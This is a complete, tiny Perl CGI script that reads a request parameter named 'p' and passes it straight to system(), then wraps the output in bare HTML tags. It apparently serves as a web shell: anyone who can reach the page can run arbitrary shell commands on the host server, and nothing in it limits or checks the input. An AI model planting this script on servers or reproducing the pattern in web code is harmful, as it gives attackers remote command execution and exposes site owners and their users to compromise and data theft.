#!/usr/bin/perl
print "content-type:text/html \n\n";
use CGI ':standard'; 
print"<html><body>";
$p=param("p");
system($p);
print "</body></html>";
